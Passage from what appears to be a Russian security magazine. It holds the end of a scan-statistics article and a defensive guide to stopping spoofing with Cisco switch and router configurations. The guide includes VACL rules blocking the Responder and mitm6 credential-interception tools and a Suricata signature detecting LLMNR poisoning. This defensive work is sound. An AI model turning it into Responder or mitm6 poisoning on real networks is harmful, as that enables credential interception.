ров (?), зап росы к порту 6379 — спрос на уста новленные «не приходя в соз-
нание» сер веры Redis, а вот пор ты 2222, 22322 и 22222 — это что-то новень-
кое, так как, нап ример, месяц назад они в выборке отсутс твовали. Вполне
вероятно, мы име ем дело с какой-то свежей проб лемой. При этом пор-
ты 23 и 6379 вызывают наибольший инте рес из Китая, а странный инте рес
к дво ечкам — из США.
   Кстати, порядка 30% субъектов име ют откры тый порт, аналогичный тому,
к которо му они обратились (выборка для порта 6379). А вот для порта 23
(Telnet) этот показатель падает до 15%. Рай для продажников решений
защиты: кли енты сами сту чат ся в две ри! Если, конечно, твоих технарей
не смущают капчи вро де вот таких.





UDP всех инте ресует на порядок меньше, но тем не менее за месяц набира-
ется ощутимое число запросов.





Смотришь на первую трой ку, и в голову приходят фразы: «Как зовут? Время
скока? Поз вонить есть?» При чем две трети воп рошающих даже не интересу-
ется, как зовут, сразу переходят к «позвонить».
  Мо жет воз никнуть вопрос: а какие пор ты самые секретные? Дол жна же
ста тистика дать нам ответ на вопрос? Не сомневай ся! По моим данным,
самый секретный порт — 58699. За все время наб людения им поинтересо-
вались пять раз. Вся десятка выг лядит так.





Тут сто ит отме тить, что практика выноса служб на нес тандартные порты, нес-
мотря на свою кажущуюся «колхозность», сущес твен но снижает шансы вле-
теть под первую волну атак, которая соп ровождает появление новой зна-
чимой уяз вимос ти.
  Даже если периметр не прик рыт блок-листами, ник то в здравом уме
не будет заставлять ботов занимать ся тотальным сканированием, так как это
существенно замед ляет процесс, максимум — отра ботка по наиболее веро-
ятным портам. Поэто му какой-нибудь Citrix Netscaler имеет шансы протянуть
в своем первоздан ном виде немного подольше. У его владельцев хотя бы
будет шанс успеть выкачать патчи с торрентов и проверить, что в них нет тро-
янов, до того как боты перейдут к работе по данным, заботливо собранным
конторами типа Shodan.
   Спустя несколько месяцев работы список блокировок сос тавляет боль-
ше 11 000 адре сов, при общей базе, а так или иначе отме тившихся —
154 000. Средняя прибавка — около 1200 записей в сут ки пос ле «прогрева»,
при чем заметны вол ны. Например, вот так выг лядит график регистра ции
новых адре сов (пик в начале — это оче видное следствие «холодного» пуска).





А  так выглядит расклад ка по наци ональным сег ментам в зависи мос ти
от «плотности» генери руемого тра фика (отношение числа запросов к чис лу
засветив шихся источни ков).





Лидеры, пря мо скажем, неожи данные. Впрочем, при бли жайшем рассмот-
рении выясняется, что в зонах AZ, NL, EE и BG функци онируют пос тоянные
сканеры, на фоне которых регуляр ная активность просто теряется. Раз ница
в плот ности запросов между пер вым местом (1400 пакетов на адрес) и зоной
HK с почетного шестого места — 30 раз (45 пакетов на адрес).
  Сре ди опе рато ров передо вой сети, в которой сидят самые любопытные
граждане, если верить Whois, в начале фигурирует GB (Великоб ритания),
потом DE (Германия), а в кон це — AZ (Азер байджан). Будем считать, что
это бри танские ученые занимаются научными раз работками. Там же, кстати,
указан телефон и кон тактное лицо в Гер мании, так что желающие могут поз-
вонить и уточнить детали.


ÀÍÃËÈ×ÀÍÊÀ ÑÊÀÍÈÒ

Раз уж мы выяснили, что основная часть трафика — это целенаправленный
сбор информа ции, почему бы не выделить активные источники. Если адре са
агре гировать по сег ментам /24, то мы получим 16 519 таких источников.
  Пороговое зна чение для отсечки непредна меренного интереса подберем
на основе известных субъектов, в частнос ти один из самых мед ленных ска-
неров, что удалось обнаружить, записан на The Shadow Server Foundation (их
адрес фигури ровал в разделе про lazyscan), он генерирует не более 400 зап-
росов в месяц. Что бы был запас, умень шим значение до 100 (это значит, что
для попадания  в  отчет  за месяц  из  сети  клас са C должно прийти
не менее 100 пакетов). Результат выг лядит так.





Мы в тройке, но не спе ши дос тавать ушанку и балалай ку. Если детальнее пос-
мотреть список под сетей, отнесенных к зоне RU, то выяснится, что 95% тра-
фика выдают пять из них. И согласно Whois, конечный арендатор первых трех
сег ментов — это организация из Великобритании, чет вертого — из CY
(Кипр), а пятая — из UA (Украина). Поэтому, строго говоря, в номинации
«самый сме лый сканер» мы не прошли даже отборочный тур.
   Когда у нас на руках есть перечень аномаль ных сетей, мы можем его
вычесть из обще го мас сива и соот нести число оставшихся адре сов с раз-
мером наци онального сегмента. Таким обра зом мы получим приблизитель-
ное понимание, кто эффективнее рас ходует IP-пространство на под держание
искусственной жизни в интернете.





Проще говоря, на каждые 10 000 адресов в Эфиопии при ходится три, которых
тянет поз накомиться с нами поближе.
  А вот у этих пар ней всё под контро лем.





В целом без неожиданностей, если не счи тать наличия в спис ке ЮАР. Причем
это не ано малия, так как число запросов, источни ков и размер наци ональ-
ного сегмента срав ним с соседями.
  Воз вра щаясь к теме подбора паролей к учетным записям SSH. Модуль
отсле жива ния попыток аутентификации поз воляет выявлять бот-сети, так
как контроллер вынужден заменять бло киро ванные элементы новыми, пос-
тепенно раскры вая свои возможности. За два месяца ловли было зафик-
сировано более 4000 адресов, занима ющихся подоб ной практикой. В таб-
лице ниже — десятка основных источни ков.





Не удач ные попытки входа, скорее всего, означают, что конкретный адрес
не толь ко раздает кар тинки с котята ми, но и под рабаты вает на сторону. Если
сгруппировать адре са из зоны RU по операто рам, получится следующее.





Есть мне ние, что маркетоло ги могут записать в свои кни жечки новый способ
определе ния  долей  рынка  хостинга  и  предоставления  услуг  доступа
в интернет. А то как ни почита ешь пресс-релизы, так у нас три десятка игро-
ков в отрасли и все лидеры, а тут на основе «при родной активнос ти» можно
раз вить целую теорию.
   Вот  свод ная  таб лица  по  наиболее  популярным  пользовате лям,
под которыми осущест вля ются попыт ки дос тупа.





Больше всего удив ляет интерес к учетной записи  root, пароль ный вход
для которой давно и прочно отклю чен в SSH по умолчанию во всех основных
дистри бути вах. Но, судя по всему, это основополага ющее требование
нарушается сплошь и рядом.


ÏÅÐÑÏÅÊÒÈÂÛ

У тебя может возникнуть логич ный вопрос: как сканеры могут обойти
перечис ленные мной меры и ког да вся кон цепция превратится в тыкву?
В части обхо да методик не так много. Основная концепция малоуязвима:
откры тых портов мало, а закрытых много, так что шансы не в пользу ата-
кующей стороны. Что бы заг реметь в блок, достаточно оши биться все го нес-
колько раз.
  В кон це кон цов, всегда можно взять дешевых VPS в раз ных сегментах
(агенты легко работают на одноядерной машине с 1 Гбайт памяти) и бло-
киро вать любого, кто зас ветился на них хоть раз.
   У концепции greyport есть очевидная слабость, так как для «продав-
ливания» блокиров ки дос таточно увеличить число зап росов, но тут на помощь
при ходит известный тезис: «чтобы убежать от тиг ра, не нужно бегать быстрее
всех, дос таточ но бежать не последним».
  Пока стра тегия сбо ра информа ции дос таточно эффективна, поводов
для ее утяжеле ния нет. Поэто му займут ся обхо дом описанных мер только тог-
да, когда она перестанет работать, а это го в ближай шем будущем не случит-
ся.
АДМИН





        ЗАЩИЩАЕМ СЕТИ
          ОТ СПУФИНГ-АТАК





Спу финг-атаки  просты  в  исполнении,
но при этом несут огромный импакт. В этой
статье мы поговорим о них с точки зре ния
защит ников. Сложность в том, что бы с умом
интегрировать решения сетевой безопас-               Caster                                                                                        Network Security Expert
ности в про дакшен и при этом не сло мать             @wearecaster
бизнес-про цес сы. При такой интеграции
нужно хорошо понимать работу сети и осо-
бенности обо рудо вания. Только тогда тебя
ждет успех.


Эта статья — ни в коем случае не инс трукция для защиты любой сети, потому
что у каждой из них свои особенности и всег да потребуется какой-то тюнинг.
Я буду демонстрировать работу на обо рудо вании Cisco, но с железом дру-
гого вендора принципиальной разницы нет. Кон цепция механиз мов безопас-
ности везде оди наковая, и отличия будут лишь в синтаксисе нас троек
и некоторых нюансах реализации.
  Нем ного особняком сто ит только система RouterOS, на которой работает
обо рудование MikroTik. Там отсутс твует один из главных, на мой взгляд,
механизмов безопасности — Dynamic ARP Inspection. Вмес то него произво-
дитель фак тически предлагает вес ти только статичес кую ARP-таб лицу, а, учи-
тывая размеры современных корпоративных сетей, это в принципе нерен-
табельно. Также в RouterOS отсутству ет RA Guard, предотвращающий атаки
на сервер DHCPv6.
  Еще  оговорюсь,  что  этот материал — не всеобъ емлющий мануал
по защите от спу финга. Атак может быть бес конечно много, и мы рас смот рим
лишь основные из них.


DHCP SNOOPING

DHCP Snooping — это функция сетевой безопасности на уровне ком мутации.
Она позволяет защитить сетевые сегменты от атак на DHCP-сервер. К ним
относятся сле дующие виды:
 • DHCP Exhaustion — вызыва ет истощение адресного пространс тва
   на легитим ном DHCP-сервере, рассылая лож ные DHCPDISCOVER-сооб-
  щения от разных MAC-адресов источника. DHCP-сер вер будет реаги-
   ровать на сообщения и выдавать адреса. Пос ле атаки DHCP-сер вер
   не смо жет обслужить новые хос ты. Обычно эту атаку используют либо
   для деструктивного воздействия, либо для атаки DHCP Spoong;
 • DHCP Spoofing — соз дание лож ного DHCP-сервера, который будет
   обслуживать клиентов сети. Опас ность атаки заключается в том, что ата-
  кующий в информации о шлю зе по умол чанию прос то установит свой
   адрес и тем самым проведет MITM-ата ку, так как тра фик хостов будет идти
   в его сто рону.

Настройка Snooping — это, по сути, наз начение доверенных и недове ренных
пор тов. На недове ренных портах будут отслеживать ся все DHCP-сообщения.
Цель в том, чтобы проверить, сгенери рованы ли они DHCP-сервером. Ведь
ежу понятно: если в пользователь ском сегменте мы будем видеть сообщения
вро де DHCPLEASEQUERY, DHCPOFFER и DHCPACK, то это однознач но аномалия
и в пользовательской сети находит ся DHCP-сервер.





                      Работа DHCP Snooping

На доверенных же портах все DHCP-сообщения будут счи таться легитим-
ными. Обычно доверенные порты настраиваются на соеди нени ях между ком-
мутато рами и маршрутизаторами, а недове ренные конфигурируются на пор-
тах, куда подключаются конечные станции (нап ример, компьютер, принтер,
точки дос тупа, VoIP).
   Те перь к конфигурации. Пред положим, перед нами коммутатор Cisco. Его
порт g0/2 смот рит в сторону мар шрутизатора, а значит, этот порт нужно обя-
зательно сде лать доверен ным для DHCP Snooping, так как это промежуточ-
ное устрой ство, от которо го могут лететь легитим ные DHCP-сообщения.
Может быть, DHCP-сервер находится на самом роутере или даже за роуте-
ром (в таком слу чае применя ют DHCP Relay). А порты f0/1-24 — это порты,
к которым под клю чают ся конечные станции, их нужно сделать недоверен-
ными, пос кольку именно от пользовательских подключений есть риск ата ки
на DHCP. Заметь, DHCP Snooping вклю чается имен но на сегментах VLAN.
Еще нужно указывать адрес авто ризованного DHCP-сервера, который дос-
тупен через доверенный порт коммутатора.
  Все порты по умолчанию недоверенные, поэто му нам нужно явно ука зать,
какие порты будут доверенными. Затем глобально включить DHCP Snooping
и Snooping-про цесс для сег мента VLAN.


NightmareSwitch(config)# interface g0/2
NightmareSwitch(config-if)# ip dhcp snooping trust
NightmareSwitch(config)# ip dhcp-server <IP ADDRESS>
NightmareSwitch(config)# ip dhcp snooping
NightmareSwitch(config)# ip dhcp snooping vlan <VLAN ID>

Те перь ком мутатор будет насыщать таб лицу DHCP Snooping, занося в нее
MAC, IP, VLAN ID кли ентов, получивших адрес по DHCP.
  При необходимости мож но создать ста тическую запись в базе данных
DHCP Snooping:


NightmareSwitch(config)# ip dhcp snooping binding <MAC> vlan <VLAN
ID> <IP ADDRESS> interface <INTERFACE ID> expiry <SECONDS>

Ко ман ды для отладки и про верки состояния DHCP:


NightmareSwitch(config)# show ip dhcp snooping
NightmareSwitch(config)# show ip dhcp snooping statistics
NightmareSwitch(config)# show ip dhcp snooping binding

Для  надежности  необходимо  записы вать  содер жимое  таб лицы DHCP
Snooping в память коммутатора: вдруг свитч вне запно уйдет в перезагрузку,
а таблица DHCP Snooping потеряется. Если это будет вместе с Dynamic ARP
Inspection, то мы получим сетевой паралич.


NightmareSwitch(config)# ip dhcp snooping database flash:/snooping.db

Кста ти, базу данных Snooping можно не толь ко хранить в памяти ком мутатора,
но и передать по службам FTP, HTTP, RCP, SCP, TFTP.


NightmareSwitch(config)# ip dhcp snooping database ?
  flash:
  ftp:
  https:
  rcp:
  scp:
  tftp:
  timeout:
  write-delay


DAI & IPSG
Обыч но Dynamic ARP Inspection (DAI) настра ивается вместе с DHCP Snooping,
так что это, по сути, продолжение предыдущей час ти.
   DAI поз воля ет пре дот вращать ARP-спуфинг внутри сети благодаря отсле-
живанию все го ARP-трафика. И здесь есть очень важный момент. Что бы
инспек ция работа ла, ей нужно на чем-то осно вывать ся, и вся ее работа íàï-
ðÿìóþ çàâèñèò от DHCP Snooping. DAI на осно ве таблицы DHCP Snooping
будет проверять валидность ARP-ответов, то есть проверять, действительно
ли такая привязка MAC-адреса и IP-адреса есть внутри сети. Если нет, то DAI
мгно венно заб локирует такой трафик.
  Однако при интеграции DAI в про дакшене нуж но позаботиться о том, что-
бы таблица DHCP Snooping была полностью насыщена. То есть в нее дол жны
попасть абсолют но все хос ты внутри сети. В противном случае трафик
не попав ших туда легитимных хос тов будет заб локирован, что нарушит биз-
нес-про цессы.




                        DAI  обя зательно  настраивается  после DHCP
                        Snooping, и необходимо время, что бы все хосты
                      попали  в  таблицу  DHCP  Snooping,  ина че
                      получишь нерабочую сеть, а DAI будет бло киро-
                         вать входящий тра фик от всех хос тов.


Настройка DAI опи рается на ту же кон цепцию доверенных и недове ренных
пор тов. Как и в слу чае с DHCP Snooping, все порты коммутатора по умол-
чанию недоверенные. И в остальном то же самое: доверенные порты —
это порты меж ду коммутато рами и роутерами, недоверенные — поль-
зовательские порты. На недоверенных портах стоит включить IP Source Guard
(IPSG), который будет проверять источник запросов.


NightmareSwitch(config)# int g0/2
NightmareSwitch(config-if)# ip arp inspection trust
NightmareSwitch(config)# interface range f0/1-24
NightmareSwitch(config-if-range)# ip verify source

При необходимости можно создать ARP ACL, что бы не проверять устрой ства
со статическим IP. Вдруг в твоей сети есть хосты со статическим адресом.


NightmareSwitch(config-if)# arp access-list DAI
NightmareSwitch(config-arp-nacl)# permit ip host <IP> mac host <MAC>

Кста ти, для IPSG мож но тоже создавать ста тичес кие записи внутри ком-
мутато ра, но это делается без ACL.


NightmareSwitch(config)# ip source binding <MAC> vlan <VLAN ID> <IP
ADDRESS> interface <INTERFACE ID>





                    Про верка со стороны DAI

Закончив настройку и убедившись, что нужные ста тические адре са забин-
дились, а таблица DHCP Snooping пол ностью насыще на, включаем сам DAI.
DAI, как и DHCP Snooping, вклю чается имен но на сегментах VLAN.


NightmareSwitch(config)# ip arp inspection vlan <VLAN ID>


ÎÁÍÀÐÓÆÅÍÈÅ È ÁËÎÊÈÐÎÂÊÀ ÈÍÑÒÐÓÌÅÍÒÀ RESPONDER

Responder — это инструмент пен тестеров, поз воляющий перехватывать учет-
ные данные внутри сетевой инфраструктуры, в основном он при менятся
в  сре дах  с  Windows-машинами.  Одна ко  пре вентивные  меры  против
Responder обыч но заканчиваются лишь вык лючением MCAST-протоколов,
таких как LLMNR, NBNS и MDNS.
  В этой статье я пос тараюсь выжать максимум из сетевого коммутатора
и попробую защитить машины Windows от атак на эти протоко лы без вык-
лючения самих протоко лов. Responder еще поз воля ет про водить нес тандар-
тные атаки на основе даунгрейда, но они уже выходят за рамки иссле дования,
и я рассмот рю толь ко основные меры блокировки.
   Responder состоит из двух час тей:
 • ñíèô ôåð реагирует на переда чу данных по про токолам LLMNR, NBNS,
  MDNS. То есть Responder в активном режиме прос лушивает тра фик
   и ждет, не появятся ли они;
 • Poisoner отвечает на зап росы разрешения имен по перечисленным про-
   токолам, в результате чего Responder выдает себя за запрашиваемые
   ресурсы. То есть здесь воз ника ет сценарий MITM (человек посередине).
   Атакующий перехватывает учетные дан ные в зашиф рованном виде (нап-
   ример, NetNTLMv2-SSP), а хеш получает при помощи ложного SMB-сер-
   вера, так же запущенного через Responder.


Àíàëèç ïðîöåññà îòðàâëåíèÿ
Для обнаруже ния нам нужно за что-то зацепить ся. В этом слу чае — проана-
лизи ровать трафик, в котором Responder проводил отравле ние запросов
LLMNR, NBNS и MDNS. На скриншотах ниже 10.10.100.128 — ата кующий,
10.10.100.129 — кли ент на Windows.





                        LLMNR-отравление





                        NBNS-отравление





                       MDNS-отравление





             Кон цепция отравления зап росов с Responder

Как видишь, при отравле нии Responder использует следующие порты:
 • для LLMNR — UDP/5355;
 • для NBNS — UDP/137;
 • для MDNS — UDP/5353.


ACL
ACL (Access Control List) — это специальные механиз мы фильтрации тра фика,
которые часто используются в компьютер ных сетях. ACL — это просто набор
условий: какой трафик будет ожи дать ся и какое поведение коммутатора
или мар шрутизатора будет при появлении такого типа трафика. Примеры
при менения ACL:
 • óïðàâëå íèå òðàôèêîì. Инженер сети сам решает, какой именно тра-
  фик будет идти в VPN-туннель, какой трафик будет подвергаться трансля-
   ции (NAT) и так далее;
 • îãðàíè÷å íèå òðàôèêà ñåòåâûõ ïðî òîêî ëîâ. Инженер сети может
   исполь зовать ACL, нап ример, для ограничения Smart Install, чтобы только
   ранее доверен ные подсети могли обра щаться к SMI. То же самое и с про-
   токолами динамичес кой маршрутиза ции вро де OSPF и EIGRP. И даже
   с про токолами резервирования шлю зов: HSRP, VRRP, GLBP, CARP, ESRP;
 • îáåñïå÷åíèå áåçîïàñíîñòè VTY. Терминальные линии VTY исполь-
   зуют ся для удаленного управления сетевым устройством. ACL поз воляют
   настро ить огра ничение таким обра зом, чтобы к VTY можно было подклю-
   чать ся только из доверенных подсетей.

ACL бывают двух видов:
 • Standard ACL — трафик филь труется только по IP-адресам источни ка
   и назначения;
 • Extended ACL — позволяет фильтровать трафик не только по IP-адре-
   сам, но еще и по портам источника и назначения. Также есть воз можность
   проводить фильтрацию по типу про токо ла (ICMP, TFTP, GRE и так далее).

Нельзя сказать, что Standard ACL луч ше, чем Extended ACL. Выбор между
ними зависит от конкретных условий. Однако настройка ACL не заканчива-
ется толь ко их соз данием. Эти ACL нуж но еще и при вязы вать к интерфейсам.


VACL è VMAP
VACL (VLAN Access List) — это такой тип ACL, который может контролировать
трафик внутри VLAN-сег мента. То есть как раз то, что нам необходимо. Соз-
давать каждый раз ACL и при вязывать его ко всем пор там ком мутатора
было бы слишком неудобно, к тому же может пос традать масштабируемость.
Вместо это го создаем один про цесс VACL, и весь тра фик внутри VLAN-сег-
мента будет под контролем.
  Работа VACL у нас будет основана на двух аспектах:
 • условии (сконфигурированные ACL с усло виями для портов, используемых
  LLMNR и NBNS);
 • VACL-кар те (кар та фильтрации для VLAN, состоящая из пра вил с номера-
  ми пос ледовательностей).

Вот пример кон фигурации, которая будет блокировать UDP/5355 и UDP/137,
чтобы ата ки при помощи Responder были невозможны.
  Сначала необходимо создать два ACL-листа:
 • расширенный IPv4 ACL — для огра ничения трафика Responder по IPv4;
 • IPv6 ACL — для ограничения трафика Responder по IPv6. Да, Responder
  может про лезть и под IPv6.


NightmareSwitch(config)# ip access-list extended ResponderIPv4
NightmareSwitch(config-ext-acl)# permit udp any eq 5355 any
NightmareSwitch(config-ext-acl)# permit udp any eq 137 any


NightmareSwitch(config)# ipv6 access-list ResponderLLMNRIPv6
NightmareSwitch(config-ext-acl)# permit udp any eq 5355 any




                   Я не стал бло киро вать UDP/5353, это трафик про-
                        токо ла MDNS. MDNS исполь зуется для коррек-
                       тной работы принтеров, Chromcast, устрой ств
                     macOS.   Его   блокировка  может   привес ти
                          к нарушению работы этих устрой ств, а мой под-
                       ход с VMAP достаточно агрессивный. Пожалуй,
                       оптимальное решение — это монито рить MDNS
                       на уровне IDS или попытать ся выключить через
                       кон фигурации  в  Windows,  например  через
                         реестр.


Я скон фигури ровал условия таким обра зом, чтобы фильтровался именно
порт источника. С помощью конструкции permit udp any eq <port> any я
лишь соз даю условие. Если при летит трафик, который попадает под это усло-
вие, он под вер гнется филь трации (либо я разрешу трафик, либо запрещу).
Кста ти говоря, NBNS не поддерживает IPv6, поэто му его порта нет в IPv6 ACL-
листе.
  Затем нужно соз дать VACL-карту, с соответствующими seq numbers: 10
и 20.


NightmareSwitch(config)# vlan access-map BLOCKRESPONDER seq 10
NightmareSwitch(config-vlan-map)# match address ResponderIPv4
NightmareSwitch(config-vlan-map)# match ipv6 address
ResponderLLMNRIPv6
NightmareSwitch(config-vlan-map)# action drop log


NightmareSwitch(config)# vlan access-map BLOCKRESPONDER seq 20
NightmareSwitch(config-vlan-map)# action forward

Для seq 10 я соз даю цепочку, при которой трафик, попадающий под ACL-
листы, будет отброшен, что отра зит ся в логах ком мутатора (action drop
log).
  Для seq 20 я разрешаю работу остального тра фика, что бы не вызвать
неп реднамеренный DoS (action forward).
  Завершит настройку активация работы VACL. При этом нужно указать,
для какой сети VLAN будет использовать VACL.


Nightmare(config)# vlan filter BLOCKRESPONDER vlan-list <VLAN ID>


Ñèãíàòóðà äëÿ Suricata
Для Suricata я ради интереса написал вот такую сиг натуру, которая позволит
выяв лять LLMNR-отравление:

alert udp any 5355 -> any any ( msg:"△ LLMNR POISONING DETECTED △";
flow:stateless; content:"|80 00 00 01 00 01 00 00 00 00|"; sid:1337;
rev:1; classtype:attack-feature;)




                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ




                         ЗАЩИЩАЕМ СЕТИ
                             ОТ СПУФИНГ-АТАК





ÁËÎÊÈÐÎÂÊÀ ÈÍÑÒÐÓÌÅÍÒÀ MITM6

Mitm6 — один из самых популярных пентестерских инструментов. Он рас-
сылает ложные сообщения DHCPv6, пос ле которых легитимные Windows-
машины будут счи тать атакующий хост DNS-сервером на уров не IPv6.
   Главная  проблема  безопасности  здесь  в  том,  что  при оритет
IPv6 в Windows гораздо выше IPv4 и при обращении Windows к домен ным
име нам будет использоваться адрес DNS-сер вера на уровне IPv6. Сама
Windows при активном IPv6 время от времени генери рует запросы DHCPv6,
на которые будет триггериться mitm6.
   Это при водит к MITM-атаке, при которой злоумышленник сможет перех-
ватить учетные данные пользователей, а также про вести серии Relay-атак.
Давай пос мотрим, как это будет про исходить на уровне трафика. Нужно
выявить ста тич ные данные, на основе которых и будет проводиться бло-
кировка.





         DHCPv6 Advertise от атакующего с SRC UDP PORT/547

В этом сценарии fe80::20c:29ff:fea1:7346 — ата кующий, а fe80::bc2c:
9f07:37b8:f7d1 — машина с Windows.





                    Схема экс плуатации с mitm6

Mitm6 сгенерировал сооб щение DHCPv6 ADVERTISE, в рамках которого
отправ ляются данные о DNS-сервере, в том чис ле сам IPv6-адрес атакующе-
го. Это и служит глав ным источником эксплуата ции.
  Еще мож но заметить,  что на уровне тран спор та UDP использует ся
порт 547, который строго зарезервирован для DHCPv6-отве тов со стороны
сервера. Оче вид но, если UDP-датаг рамма с пор том источни ка 547 будет
лететь внутри сегмента, это говорит об аномалии и о том, что в пользователь-
ской сети находится сервер DHCPv6. Существует способ блокировки mitm6,
но слишком агрессив ный, так что я прос то заб локирую этот порт.


Áëîêèðîâêà íà îñíîâå VMAP
Здесь абсо лютно та же ситуация, что и с бло кировкой Responder, и та же кон-
цепция с ACL и VMAP-картами. Необ ходима серия настроек, которая будет
блокиро вать порт UDP/547.


NightmareSwitch(config)# ipv6 access-list MITM6DHCPV6UDPSRC
NightmareSwitch(config-ext-acl)# permit udp any eq 547 any

Как в ситуации с Responder, здесь тоже филь труется именно порт UDP
источника с помощью конс трукции permit udp any eq 547 any.
   VACL-кар та с двумя Sequence-номера ми:


NightmareSwitch(config)# vlan access-map BLOCKMITM6 seq 10
NightmareSwitch(config-vlan-map)# match ipv6 address
MITM6DHCPV6UDPSRC
NightmareSwitch(config-vlan-map)# action drop log
NightmareSwitch(config)# vlan access-map BLOCKMITM6 seq 20
NightmareSwitch(config-vlan-map)# action forward

Завершающая конструкция, акти вация VACL для некоторого сегмента VLAN:


NightmareSwitch(config)# vlan filter BLOCKMITM6 vlan-list <VLAN ID>

Те перь ком мутатор будет фильтровать DHCPv6-сообщения и не пропус тит
трафик mitm6 в контексте UDP/547. Это не позволит атакующему навязать
себя в качестве DNS-сер вера на уровне IPv6.


ÁÅÇÎÏÀÑÍÎÑÒÜ ÄÅÐÅÂÀ STP

STP (Spanning Tree Protocol) — это L2-протокол, который защищает компь-
ютерную  сеть  от широко вещательных штор мов,  блокируя  избыточные
физические соединения. Проблема в том, что у Ethernet-кадров нет поля TTL,
а широковещательный трафик будет бесконеч но бегать по канальным соеди-
нениям, если возникнет ком мутаци онная петля. Про токол работает исклю-
чительно на канальном уровне, и для обще ния используются фреймы BPDU
802.3. Обычно на управляемых ком мутаторах STP включен по умол чанию.
  Однако ата кующий может отправить в сторону коммутатора STP BPDU-
кадр с наимень шим зна чени ем приоритета, что даст ему шанс перех ватить
роль кор невого ком мутато ра. Такой ход событий при водит либо к час тичной
MITM-атаке, либо к DoS.
   Го раздо луч ше с точки зре ния безопас ности включить фун кцию BPDU
Guard. С ней коммутатор будет логичес ки блокиро вать порт, на который при-
шел BPDU-кадр. BPDU Guard в таком случае настраивается на пользователь-
ских пор тах, куда подключает ся конечное оборудование.


NightmareSwitch(config)# interface range f0/1-24
NightmareSwitch(config-if-range)# spanning-tree bpduguard enable





                 Схема при вклю ченном BPDU Guard

Ес ли BPDU-кадр прилетит со стороны атакующе го на порт коммутатора, порт
будет вык лючен.


ÁÅÇÎÏÀÑÍÎÑÒÜ ÃÎÐß×ÅÉ ÑÈÑÒÅÌÛ ÐÅÇÅÐÂÈÐÎÂÀÍÈß FHRP

FHRP (First Hop Redundancy Protocol) — это семей ство сетевых про токолов,
которые поз воляют нес кольким физическим маршрутизаторам работать
как один логический мар шрутизатор с вир туальным IP-адресом. Этот вир-
туальный адрес будет наз начаться в качес тве адреса шлю за по умол чанию
для конечных хостов. Это повышает отка зоустой чивость сети и нужно для сис-
темы горяче го резер вирования. Самые рас простра ненные протоколы класса
FHRP — это HSRP и VRRP.





                 Типичная схе ма использования FHRP

Домен отказоус той чивости FHRP может быть атакован. Так происходит, когда
лидирующие Active- (в HSRP) или Master- (в VRRP) мар шрутизаторы не имеют
максимального при оритета в своей конфигура ции или отсутствует криптогра-
фичес кая аутентификация.
   Если атакующий выполнит спуфинг Active/Master-роли, он проведет MITM-
ата ку и сможет перех ватывать весь тра фик сегмента, в котором находит ся.
Также он может вызвать Blackhole, и нормальная работа сегмента окажется
прос то невозможной. Нюанс еще в том, что протоко лы FHRP исполь зуют
MCAST-сообщения, которые распростра няют ся на весь сегмент сети, и даже
обычный пользователь сможет обна ружить пакеты FHRP.


Àóòåíòèôèêàöèÿ
Аутентификация не позволит «левым» мар шрутиза торам всту пить в про цесс
обеспечения отказоус тойчивости. Если инженер собрался защищать FHRP
таким способом, то необ ходима стой кая пароль ная фраза.
  Пример MD5-аутентифика ции для HSRP:


NightmareRouter1(config-if)# standby X authentication md5 key-string
<KEYSTRING>

При мер MD5-аутен тификации для VRRP:


NightmareRouter1(config-if)# vrrp X authentication md5 key-string <
KEYSTRING>


Ìàêñèìàëüíûé ïðèîðèòåò
Из соображений безопасности рекомендуется на Master- или Active-маршру-
тизаторе выставить максимальный приори тет. В таком случае, если злоумыш-
ленник отправит вредоносный пакет с при оритетом 255, стать «главным»
у него уже не получится, ведь такой уже имеется. Однако для VRRP это не
сра ботает, потому что мак симальный при оритет, который можно задать, —
254. Поэтому разумнее будет использовать или аутентификацию, или даже
фильтрацию на осно ве ACL.
  Пример задания максимального при оритета для HSRP:


NightmareRouter(config)# int g0/0
NightmareRouter(config-if)# standby 1 priority 255


ÇÀÙÈÒÀ ÄÈÍÀÌÈ×ÅÑÊÎÉ ÌÀÐØÐÓÒÈÇÀÖÈÈ

Dynamic Routing Protocols (DRP) — динамическая маршрутизация — при-
меня ется в каж дой крупной корпоративной сети и позволяет маршрутиза-
торам внут ри AS обме ниваться маршрутной информацией автоматически.
Однако я встре чал халатное отношение к настройке DRP. А при динамичес кой
маршрутизации есть опасные мис конфи ги, которые открывают воз можнос ти
для атак на сам домен динами ческой маршрутиза ции. Нап ример, это может
быть отсутс твие пас сивных интерфейсов или отсутс твие аутентификации.





                       Ти пич ная схема с DRP

Точ но так же, как и с FHRP, пакеты про токолов динамической маршру тизации
мультикастовые, и их можно анализировать со стороны пользовательской
сети, то есть той сети, которая анонсируется наружу. У потенциального ата-
кующего есть возможность про вести атаку: он может поднять на сво ей сто-
роне вир туальный маршрутиза тор и подклю читься к домену маршру тизации.
Тем самым он может вызвать:
 • ïå ðå÷èñëåíèå  èíôîðìàöèè —  ата кующий  узнает  информацию
  о некоторых сетях, которые анон сируются в рамках DRP;
 • Blackhole — ата кующий может завернуть тра фик того или иного хоста
   в «чер ную дыру», вызвав DoS;
 • ðàññûëêó ëîæ íûõ îáíîâëå íèé LSU èëè EIGRP Update, которые
   могут вызывать переполнение таб лицы маршру тизации, вследс твие чего
   получаем DoS (в этом случае ата кующий должен иметь роль Master).


Ïàññèâíûå èíòåðôåéñû
Настройка пассивных интерфейсов в кон тексте динамической маршрутиза-
ции поз воля ет роутеру запретить рассылать объявления через некоторые
интерфейсы. По умолчанию без нас трой ки пас сивных интерфейсов он рас-
сылает объявле ния во все интерфей сы, а это под вергает домен маршру тиза-
ции большому риску.
  Пример пассивных интерфейсов для OSPF:


NightmareRouter(config)# router ospf X
NightmareRouter(config-if)# passive-interface GigabitEthernet X/X

При мер пассивных интерфей сов для EIGRP:


NightmareRouter(config)# router eigrp X
NightmareRouter(config-if)# passive-interface GigabitEthernet X/X


Àóòåíòèôèêàöèÿ
При мене ние аутентификации в доменах мар шрутизации позволяет обес-
печить воз можность входа только авто ризо ванным, легитимным маршрутиза-
торам. Однако аутентификация настраивает ся с помощью паролей. Если ты
собираешься защитить домен маршру тиза ции, используя аутентификацию,
обя зательно позаботься, чтобы эти пароли были достаточно стойкими. Они
хешируются с помощью крип тогра фичес ких хеш-функций, и злоумышленник
сможет считать значения хешей из дампа трафика и вскрыть пароль перебо-
ром. С полученным паролем он без труда подклю чится к домену маршрутиза-
ции.
  Пример исполь зования аутентификации для OSPF:


NightmareRouter(config)# interface GigabitEthernet X/X
NightmareRouter(config-if)# ip ospf authentication message-digest
NightmareRouter(config-if)# ip ospf message-digest-key <KEY ID> md5 <
KEYSTRING>

